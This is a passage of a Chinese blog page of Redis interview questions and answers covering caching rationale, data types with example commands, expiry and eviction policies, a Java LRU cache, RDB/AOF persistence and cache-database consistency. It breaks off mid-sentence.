href="#gossip-协议">gossip 协议</a></li><li><a href="#ping-消息深入">ping 消息深入</a></li></ul></li><li><a href="#分布式寻址算法">分布式寻址算法</a><ul><li><a href="#hash-算法">hash 算法</a></li><li><a href="#一致性-hash-算法">一致性 hash 算法</a></li><li><a href="#redis-cluster-的-hash-slot-算法">redis cluster 的 hash slot 算法</a></li></ul></li><li><a href="#redis-cluster-的高可用与主备切换原理">redis cluster 的高可用与主备切换原理</a><ul><li><a href="#判断节点宕机">判断节点宕机</a></li><li><a href="#从节点过滤">从节点过滤</a></li><li><a href="#从节点选举">从节点选举</a></li><li><a href="#与哨兵比较">与哨兵比较</a></li></ul></li></ul></li></ul></li><li><a href="#生产环境中的-redis-是怎么部署的">生产环境中的 redis 是怎么部署的？</a><ul><li><a href="#面试官心理分析-8">面试官心理分析</a></li><li><a href="#面试题剖析-8">面试题剖析</a></li></ul></li></ul><!-- tocstop --><h1><span id="项目中缓存是如何使用的为什么要用缓存缓存使用不当会造成什么后果">项目中缓存是如何使用的？为什么要用缓存？缓存使用不当会造成什么后果？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>这个问题，互联网公司必问，要是一个人连缓存都不太清楚，那确实比较尴尬。</p><p>只要问到缓存，上来第一个问题，肯定是先问问你项目哪里用了缓存？为啥要用？不用行不行？如果用了以后可能会有什么不良的后果？</p><p>这就是看看你对缓存这个东西背后有没有思考，如果你就是傻乎乎的瞎用，没法给面试官一个合理的解答，那面试官对你印象肯定不太好，觉得你平时思考太少，就知道干活儿。</p><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="项目中缓存是如何使用的">项目中缓存是如何使用的？</span></h3><p>这个，需要结合自己项目的业务来。</p><h3><span id="为什么要用缓存">为什么要用缓存？</span></h3><p>用缓存，主要有两个用途：<strong>高性能</strong>、<strong>高并发</strong>。</p><h4><span id="高性能">高性能</span></h4><p>假设这么个场景，你有个操作，一个请求过来，吭哧吭哧你各种乱七八糟操作 mysql，半天查出来一个结果，耗时 600ms。但是这个结果可能接下来几个小时都不会变了，或者变了也可以不用立即反馈给用户。那么此时咋办？</p><p>缓存啊，折腾 600ms 查出来的结果，扔缓存里，一个 key 对应一个 value，下次再有人查，别走 mysql 折腾 600ms 了，直接从缓存里，通过一个 key 查出来一个 value，2ms 搞定。性能提升 300 倍。</p><p>就是说对于一些需要复杂操作耗时查出来的结果，且确定后面不怎么变化，但是有很多读请求，那么直接将查询出来的结果放在缓存中，后面直接读缓存就好。</p><h4><span id="高并发">高并发</span></h4><p>mysql 这么重的数据库，压根儿设计不是让你玩儿高并发的，虽然也可以玩儿，但是天然支持不好。mysql 单机支撑到 <code>2000QPS</code> 也开始容易报警了。</p><p>所以要是你有个系统，高峰期一秒钟过来的请求有 1万，那一个 mysql 单机绝对会死掉。你这个时候就只能上缓存，把很多数据放缓存，别放 mysql。缓存功能简单，说白了就是 <code>key-value</code> 式操作，单机支撑的并发量轻松一秒几万十几万，支撑高并发 so easy。单机承载并发量是 mysql 单机的几十倍。</p><blockquote><p>缓存是走内存的，内存天然就支撑高并发。</p></blockquote><h3><span id="用了缓存之后会有什么不良后果">用了缓存之后会有什么不良后果？</span></h3><p>常见的缓存问题有以下几个：</p><ul><li>[缓存与数据库双写不一致]</li><li><a href="/2020/03/25/dp/" title="动态规划集合">动态规划集合</a></li></ul><ul><li><p>[缓存雪崩、缓存穿透]</p></li><li><p>[缓存并发竞争]</p></li></ul><p>后面再详细说明。</p><h1><span id="redis-都有哪些数据类型分别在哪些场景下使用比较合适">redis 都有哪些数据类型？分别在哪些场景下使用比较合适？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>除非是面试官感觉看你简历，是工作 3 年以内的比较初级的同学，可能对技术没有很深入的研究，面试官才会问这类问题。否则，在宝贵的面试时间里，面试官实在不想多问。</p><p>其实问这个问题，主要有两个原因：</p><ul><li>看看你到底有没有全面的了解 redis 有哪些功能，一般怎么来用，啥场景用什么，就怕你别就会最简单的 KV 操作；</li><li>看看你在实际项目里都怎么玩儿过 redis。</li></ul><p>要是你回答的不好，没说出几种数据类型，也没说什么场景，你完了，面试官对你印象肯定不好，觉得你平时就是做个简单的 set 和 get。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>redis 主要有以下几种数据类型：</p><ul><li>string</li><li>hash</li><li>list</li><li>set</li><li>sorted set</li></ul><h3><span id="string">string</span></h3><p>这是最简单的类型，就是普通的 set 和 get，做简单的 KV 缓存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> college szu</span><br></pre></td></tr></table></figure><h3><span id="hash">hash</span></h3><p>这个是类似 map 的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是<strong>这个对象没嵌套其他的对象</strong>）给缓存在 redis 里，然后每次读写缓存的时候，可以就操作 hash 里的<strong>某个字段</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hset person name bingo</span><br><span class="line">hset person age 20</span><br><span class="line">hset person id 1</span><br><span class="line">hget person name</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">person = &#123;</span><br><span class="line">    "name": "bingo",</span><br><span class="line">    "age": 20,</span><br><span class="line">    "id": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="list">list</span></h3><p>list 是有序列表，这个可以玩儿出很多花样。</p><p>比如可以通过 list 存储一些列表型的数据结构，类似粉丝列表、文章的评论列表之类的东西。</p><p>比如可以通过 lrange 命令，读取某个闭区间内的元素，可以基于 list 实现分页查询，这个是很棒的一个功能，基于 redis 实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西，性能高，就一页一页走。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0开始位置，-1结束位置，结束位置为-1时，表示列表的最后一个位置，即查看所有。</span></span><br><span class="line">lrange mylist 0 -1</span><br></pre></td></tr></table></figure><p>比如可以搞个简单的消息队列，从 list 头怼进去，从 list 尾巴那里弄出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lpush mylist 1</span><br><span class="line">lpush mylist 2</span><br><span class="line">lpush mylist 3 4 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">rpop mylist</span><br></pre></td></tr></table></figure><h3><span id="set">set</span></h3><p>set 是无序集合，自动去重。</p><p>直接基于 set 将系统里需要去重的数据扔进去，自动就给去重了，如果你需要对一些数据进行快速的全局去重，你当然也可以基于 jvm 内存里的 HashSet 进行去重，但是如果你的某个系统部署在多台机器上呢？得基于 redis 进行全局的 set 去重。</p><p>可以基于 set 玩儿交集、并集、差集的操作，比如交集吧，可以把两个人的粉丝列表整一个交集，看看俩人的共同好友是谁？对吧。</p><p>把两个大 V 的粉丝都放在两个 set 中，对两个 set 做交集。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-------操作一个set-------</span></span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">sadd mySet 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看全部元素</span></span><br><span class="line">smembers mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否包含某个值</span></span><br><span class="line">sismember mySet 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除某个/些元素</span></span><br><span class="line">srem mySet 1</span><br><span class="line">srem mySet 2 4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看元素个数</span></span><br><span class="line">scard mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机删除一个元素</span></span><br><span class="line">spop mySet</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------操作多个set-------</span></span><br><span class="line"><span class="comment"># 将一个set的元素移动到另外一个set</span></span><br><span class="line">smove yourSet mySet 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求两set的交集</span></span><br><span class="line">sinter yourSet mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求两set的并集</span></span><br><span class="line">sunion yourSet mySet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求在yourSet中而不在mySet中的元素</span></span><br><span class="line">sdiff yourSet mySet</span><br></pre></td></tr></table></figure><h3><span id="sorted-set">sorted set</span></h3><p>sorted set 是排序的 set，去重但可以排序，写进去的时候给一个分数，自动根据分数排序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">zadd board 85 zhangsan</span><br><span class="line">zadd board 72 lisi</span><br><span class="line">zadd board 96 wangwu</span><br><span class="line">zadd board 63 zhaoliu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取排名前三的用户（默认是升序，所以需要 rev 改为降序）</span></span><br><span class="line">zrevrange board 0 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取某用户的排名</span></span><br><span class="line">zrank board zhaoliu</span><br></pre></td></tr></table></figure><h1><span id="redis-的过期策略都有哪些内存淘汰机制都有哪些手写一下-lru-代码实现">redis 的过期策略都有哪些？内存淘汰机制都有哪些？手写一下 LRU 代码实现？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>如果你连这个问题都不知道，上来就懵了，回答不出来，那线上你写代码的时候，想当然的认为写进 redis 的数据就一定会存在，后面导致系统各种 bug，谁来负责？</p><p>常见的有两个问题：</p><ul><li>往 redis 写入的数据怎么没了？</li></ul><p>可能有同学会遇到，在生产环境的 redis 经常会丢掉一些数据，写进去了，过一会儿可能就没了。我的天，同学，你问这个问题就说明 redis 你就没用对啊。redis 是缓存，你给当存储了是吧？</p><p>啥叫缓存？用内存当缓存。内存是无限的吗，内存是很宝贵而且是有限的，磁盘是廉价而且是大量的。可能一台机器就几十个 G 的内存，但是可以有几个 T 的硬盘空间。redis 主要是基于内存来进行高性能、高并发的读写操作的。</p><p>那既然内存是有限的，比如 redis 就只能用 10G，你要是往里面写了 20G 的数据，会咋办？当然会干掉 10G 的数据，然后就保留 10G 的数据了。那干掉哪些数据？保留哪些数据？当然是干掉不常用的数据，保留常用的数据了。</p><ul><li>数据明明过期了，怎么还占用着内存？</li></ul><p>这是由 redis 的过期策略来决定。</p><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="redis-过期策略">redis 过期策略</span></h3><p>redis 过期策略是：<strong>定期删除+惰性删除</strong>。</p><p>所谓<strong>定期删除</strong>，指的是 redis 默认是每隔 100ms 就随机抽取一些设置了过期时间的 key，检查其是否过期，如果过期就删除。</p><p>假设 redis 里放了 10w 个 key，都设置了过期时间，你每隔几百毫秒，就检查 10w 个 key，那 redis 基本上就死了，cpu 负载会很高的，消耗在你的检查过期 key 上了。注意，这里可不是每隔 100ms 就遍历所有的设置过期时间的 key，那样就是一场性能上的<strong>灾难</strong>。实际上 redis 是每隔 100ms <strong>随机抽取</strong>一些 key 来检查和删除的。</p><p>但是问题是，定期删除可能会导致很多过期 key 到了时间并没有被删除掉，那咋整呢？所以就是惰性删除了。这就是说，在你获取某个 key 的时候，redis 会检查一下 ，这个 key 如果设置了过期时间那么是否过期了？如果过期了此时就会删除，不会给你返回任何东西。</p><blockquote><p>获取 key 的时候，如果此时 key 已经过期，就删除，不会返回任何东西。</p></blockquote><p>但是实际上这还是有问题的，如果定期删除漏掉了很多过期 key，然后你也没及时去查，也就没走惰性删除，此时会怎么样？如果大量过期 key 堆积在内存里，导致 redis 内存块耗尽了，咋整？</p><p>答案是：<strong>走内存淘汰机制</strong>。</p><h3><span id="内存淘汰机制">内存淘汰机制</span></h3><p>redis 内存淘汰机制有以下几个：</p><ul><li>noeviction: 当内存不足以容纳新写入数据时，新写入操作会报错，这个一般没人用吧，实在是太恶心了。</li><li><strong>allkeys-lru</strong>：当内存不足以容纳新写入数据时，在<strong>键空间</strong>中，移除最近最少使用的 key（这个是<strong>最常用</strong>的）。</li><li>allkeys-random：当内存不足以容纳新写入数据时，在<strong>键空间</strong>中，随机移除某个 key，这个一般没人用吧，为啥要随机，肯定是把最近最少使用的 key 给干掉啊。</li><li>volatile-lru：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，移除最近最少使用的 key（这个一般不太合适）。</li><li>volatile-random：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，<strong>随机移除</strong>某个 key。</li><li>volatile-ttl：当内存不足以容纳新写入数据时，在<strong>设置了过期时间的键空间</strong>中，有<strong>更早过期时间</strong>的 key 优先移除。</li></ul><h3><span id="手写一个-lru-算法">手写一个 LRU 算法</span></h3><p>你可以现场手写最原始的 LRU 算法，那个代码量太大了，似乎不太现实。</p><p>不求自己纯手工从底层开始打造出自己的 LRU，但是起码要知道如何利用已有的 JDK 数据结构实现一个 Java 版的 LRU。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cap,count;</span><br><span class="line">    HashMap&lt;Integer,Node&gt; map=<span class="keyword">new</span> HashMap();</span><br><span class="line">    Node head,tail;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        Node pre,next;</span><br><span class="line">        <span class="keyword">int</span> val,key;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> key,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.key=key;</span><br><span class="line">            <span class="keyword">this</span>.val=value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        cap=capacity;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        head=<span class="keyword">new</span> Node();</span><br><span class="line">        tail=<span class="keyword">new</span> Node();</span><br><span class="line">        head.next=tail;</span><br><span class="line">        tail.pre=head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        Node n = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="keyword">null</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        remove(n);</span><br><span class="line">        add(n);</span><br><span class="line">        <span class="keyword">return</span> n.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        Node n = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="keyword">null</span>)&#123;</span><br><span class="line">            n = <span class="keyword">new</span> Node(key,value);</span><br><span class="line">            map.put(key,n);</span><br><span class="line">            add(n);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            n.val=value;</span><br><span class="line">            remove(n);</span><br><span class="line">            add(n);</span><br><span class="line">        &#125;<span class="keyword">if</span>(count&gt;cap)&#123;</span><br><span class="line">            Node del=tail.pre;</span><br><span class="line">            remove(del);</span><br><span class="line">            map.remove(del.key);</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">        Node after=head.next;</span><br><span class="line">        head.next=n;</span><br><span class="line">        n.pre=head;</span><br><span class="line">        n.next=after;</span><br><span class="line">        after.pre=n;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(Node n)</span></span>&#123;</span><br><span class="line">         Node before=n.pre,after=n.next;</span><br><span class="line">         before.next=after;</span><br><span class="line">         after.pre=before;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="redis-的持久化有哪几种方式不同的持久化机制都有什么优缺点持久化机制具体底层是如何实现的">redis 的持久化有哪几种方式？不同的持久化机制都有什么优缺点？持久化机制具体底层是如何实现的？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>redis 如果仅仅只是将数据缓存在内存里面，如果 redis 宕机了再重启，内存里的数据就全部都弄丢了啊。你必须得用 redis 的持久化机制，将数据写入内存的同时，异步的慢慢的将数据写入磁盘文件里，进行持久化。</p><p>如果 redis 宕机重启，自动从磁盘上加载之前持久化的一些数据就可以了，也许会丢失少许数据，但是至少不会将所有数据都弄丢。</p><p>这个其实一样，针对的都是 redis 的生产环境可能遇到的一些问题，就是 redis 要是挂了再重启，内存里的数据不就全丢了？能不能重启的时候把数据给恢复了？</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>持久化主要是做灾难恢复、数据恢复，也可以归类到高可用的一个环节中去，比如你 redis 整个挂了，然后 redis 就不可用了，你要做的事情就是让 redis 变得可用，尽快变得可用。</p><p>重启 redis，尽快让它对外提供服务，如果没做数据备份，这时候 redis 启动了，也不可用啊，数据都没了。</p><p>很可能说，大量的请求过来，缓存全部无法命中，在 redis 里根本找不到数据，这个时候就死定了，出现<strong>缓存雪崩</strong>问题。所有请求没有在 redis 命中，就会去 mysql 数据库这种数据源头中去找，一下子 mysql 承接高并发，然后就挂了…</p><p>如果你把 redis 持久化做好，备份和恢复方案做到企业级的程度，那么即使你的 redis 故障了，也可以通过备份数据，快速恢复，一旦恢复立即对外提供服务。</p><h3><span id="redis-持久化的两种方式">redis 持久化的两种方式</span></h3><ul><li>RDB：RDB 持久化机制，是对 redis 中的数据执行<strong>周期性</strong>的持久化。</li><li>AOF：AOF 机制对每条写入命令作为日志，以 <code>append-only</code> 的模式写入一个日志文件中，在 redis 重启的时候，可以通过<strong>回放</strong> AOF 日志中的写入指令来重新构建整个数据集。</li></ul><p>通过 RDB 或 AOF，都可以将 redis 内存中的数据给持久化到磁盘上面来，然后可以将这些数据备份到别的地方去，比如说阿里云等云服务。</p><p>如果 redis 挂了，服务器上的内存和磁盘上的数据都丢了，可以从云服务上拷贝回来之前的数据，放到指定的目录中，然后重新启动 redis，redis 就会自动根据持久化数据文件中的数据，去恢复内存中的数据，继续对外提供服务。</p><p>如果同时使用 RDB 和 AOF 两种持久化机制，那么在 redis 重启的时候，会使用 <strong>AOF</strong> 来重新构建数据，因为 AOF 中的<strong>数据更加完整</strong>。</p><h4><span id="rdb-优缺点">RDB 优缺点</span></h4><ul><li>RDB 会生成多个数据文件，每个数据文件都代表了某一个时刻中 redis 的数据，这种多个数据文件的方式，<strong>非常适合做冷备</strong>，可以将这种完整的数据文件发送到一些远程的安全存储上去，比如说 Amazon 的 S3 云服务上去，在国内可以是阿里云的 ODPS 分布式存储上，以预定好的备份策略来定期备份 redis 中的数据。</li><li>RDB 对 redis 对外提供的读写服务，影响非常小，可以让 redis <strong>保持高性能</strong>，因为 redis 主进程只需要 fork 一个子进程，让子进程执行磁盘 IO 操作来进行 RDB 持久化即可。</li><li>相对于 AOF 持久化机制来说，直接基于 RDB 数据文件来重启和恢复 redis 进程，更加快速。</li><li>如果想要在 redis 故障时，尽可能少的丢失数据，那么 RDB 没有 AOF 好。一般来说，RDB 数据快照文件，都是每隔 5 分钟，或者更长时间生成一次，这个时候就得接受一旦 redis 进程宕机，那么会丢失最近 5 分钟的数据。</li><li>RDB 每次在 fork 子进程来执行 RDB 快照数据文件生成的时候，如果数据文件特别大，可能会导致对客户端提供的服务暂停数毫秒，或者甚至数秒。</li></ul><h4><span id="aof-优缺点">AOF 优缺点</span></h4><ul><li>AOF 可以更好的保护数据不丢失，一般 AOF 会每隔 1 秒，通过一个后台线程执行一次<code>fsync</code>操作，最多丢失 1 秒钟的数据。</li><li>AOF 日志文件以 <code>append-only</code> 模式写入，所以没有任何磁盘寻址的开销，写入性能非常高，而且文件不容易破损，即使文件尾部破损，也很容易修复。</li><li>AOF 日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。因为在 <code>rewrite</code> log 的时候，会对其中的指令进行压缩，创建出一份需要恢复数据的最小日志出来。在创建新日志文件的时候，老的日志文件还是照常写入。当新的 merge 后的日志文件 ready 的时候，再交换新老日志文件即可。</li><li>AOF 日志文件的命令通过非常可读的方式进行记录，这个特性非常<strong>适合做灾难性的误删除的紧急恢复</strong>。比如某人不小心用 <code>flushall</code> 命令清空了所有数据，只要这个时候后台 <code>rewrite</code> 还没有发生，那么就可以立即拷贝 AOF 文件，将最后一条 <code>flushall</code> 命令给删了，然后再将该 <code>AOF</code> 文件放回去，就可以通过恢复机制，自动恢复所有数据。</li><li>对于同一份数据来说，AOF 日志文件通常比 RDB 数据快照文件更大。</li><li>AOF 开启后，支持的写 QPS 会比 RDB 支持的写 QPS 低，因为 AOF 一般会配置成每秒 <code>fsync</code> 一次日志文件，当然，每秒一次 <code>fsync</code>，性能也还是很高的。（如果实时写入，那么 QPS 会大降，redis 性能会大大降低）</li><li>以前 AOF 发生过 bug，就是通过 AOF 记录的日志，进行数据恢复的时候，没有恢复一模一样的数据出来。所以说，类似 AOF 这种较为复杂的基于命令日志 / merge / 回放的方式，比基于 RDB 每次持久化一份完整的数据快照文件的方式，更加脆弱一些，容易有 bug。不过 AOF 就是为了避免 rewrite 过程导致的 bug，因此每次 rewrite 并不是基于旧的指令日志进行 merge 的，而是<strong>基于当时内存中的数据进行指令的重新构建</strong>，这样健壮性会好很多。</li></ul><h3><span id="rdb-和-aof-到底该如何选择">RDB 和 AOF 到底该如何选择</span></h3><ul><li>不要仅仅使用 RDB，因为那样会导致你丢失很多数据；</li><li>也不要仅仅使用 AOF，因为那样有两个问题：第一，你通过 AOF 做冷备，没有 RDB 做冷备来的恢复速度更快；第二，RDB 每次简单粗暴生成数据快照，更加健壮，可以避免 AOF 这种复杂的备份和恢复机制的 bug；</li><li>redis 支持同时开启开启两种持久化方式，我们可以综合使用 AOF 和 RDB 两种持久化机制，用 AOF 来保证数据不丢失，作为数据恢复的第一选择; 用 RDB 来做不同程度的冷备，在 AOF 文件都丢失或损坏不可用的时候，还可以使用 RDB 来进行快速的数据恢复。</li></ul><h1><span id="如何保证缓存与数据库的双写一致性">如何保证缓存与数据库的双写一致性？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>你只要用缓存，就可能会涉及到缓存与数据库双存储双写，你只要是双写，就一定会有数据一致性的问题，那么你如何解决一致性问题？</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>一般来说，如果允许缓存可以稍微的跟数据库偶尔有不一致的情况，也就是说如果你的系统<strong>不是严格要求</strong> “缓存+数据库” 必须保持一致性的话，最好不要做这个方案，即：<strong>读请求和写请求串行化</strong>，串到一个<strong>内存队列</strong>里去。</p><p>串行化可以保证一定不会出现不一致的情况，但是它也会导致系统的吞吐量大幅度降低，用比正常情况下多几倍的机器去支撑线上的一个请求。</p><h3><span id="cache-aside-pattern">Cache Aside Pattern</span></h3><p>最经典的缓存+数据库读写的模式，就是 Cache Aside Pattern。</p><ul><li>读的时候，先读缓存，缓存没有的话，就读数据库，然后取出数据后放入缓存，同时返回响应。</li><li>更新的时候，<strong>先更新数据库，然后再删除缓存</strong>。</li></ul><p><strong>为什么是删除缓存，而不是更新缓存？</strong></p><p>原因很简单，很多时候，在复杂点的缓存场景，缓存不单单是数据库中直接取出来的值。</p><p>比如可能更新了某个表的一个字段，然后其对应的缓存，是需要查询另外两个表的数据并进行运算，才能计算出缓存最新的值的。</p><p>另外更新缓存的代价有时候是很高的。是不是说，每次修改数据库的时候，都一定要将其对应的缓存更新一份？也许有的场景是这样，但是对于<strong>比较复杂的缓存数据计算的场景</strong>，就不是这样了。如果你频繁修改一个缓存涉及的多个表，缓存也频繁更新。但是问题在于，<strong>这个缓存到底会不会被频繁访问到？</strong></p><p>举个栗子，一个缓存涉及的表的字段，在 1 分钟内就修改了 20 次，或者是 100 次，那么缓存更新 20 次、100 次；但是这个缓存在 1 分钟内只被读取了 1 次，有<strong>大量的冷数据</strong>。实际上，如果你只是删除缓存的话，那么在 1 分钟内，这个缓存不过就重新计算一次而已，开销大幅度降低。<strong>用到缓存才去算缓存。</strong></p><p>其实删除缓存，而不是更新缓存，就是一个 lazy 计算的思想，不要每次都重新做复杂的计算，不管它会不会用到，而是让它到需要被使用的时候再重新计算。像 mybatis，hibernate，都有懒加载思想。查询一个部门，部门带了一个员工的 list，没有必要说每次查询部门，都把里面的 1000 个员工的数据也同时查出来啊。80% 的情况，查这个部门，就只是要访问这个部门的信息就可以了。先查部门，同时要访问里面的员工，那么这个时候只有在你要访问里面的员工的时候，才会去数据库里面查询 1000 个员工。</p><h3><span id="最初级的缓存不一致问题及解决方案">最初级的缓存不一致问题及解决方案</span></h3><p>问题：先更新数据库，再删除缓存。如果删除缓存失败了，那么会导致数据库中是新数据，缓存中是旧数据，数据就出现了不一致。</p><p><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-junior-inconsistent.png" alt="redis-junior-inconsistent"></p><p>解决思路：先删除缓存，再更新数据库。如果数据库更新失败了，那么数据库中是旧数据，缓存中是空的，那么数据不会不一致。因为读的时候缓存没有，所以去读了数据库中的旧数据，然后更新到缓存中。</p><h3><span id="比较复杂的数据不一致问题分析">比较复杂的数据不一致问题分析</span></h3><p>数据发生了变更，先删除了缓存，然后要去修改数据库，此时还没修改。一个请求过来，去读缓存，发现缓存空了，去查询数据库，<strong>查到了修改前的旧数据</strong>，放到了缓存中。随后数据变更的程序完成了数据库的修改。完了，数据库和缓存中的数据不一样了…</p><p><strong>为什么上亿流量高并发场景下，缓存会出现这个问题？</strong></p><p>只有在对一个数据在并发的进行读写的时候，才可能会出现这种问题。其实如果说你的并发量很低的话，特别是读并发很低，每天访问量就 1 万次，那么很少的情况下，会出现刚才描述的那种不一致的场景。但是问题是，如果每天的是上亿的流量，每秒并发读是几万，每秒只要有数据更新的请求，就<strong>可能会出现上述的数据库+缓存不一致的情况</strong>。</p><p><strong>解决方案如下：</strong></p><p>更新数据的时候，根据<strong>数据的唯一标识</strong>，将操作路由之后，发送到一个 jvm 内部队列中。读取数据的时候，如果发现数据不在缓存中，那么将重新执行“读取数据+更新缓存”的操作，根据唯一标识路由之后，也发送到同一个 jvm 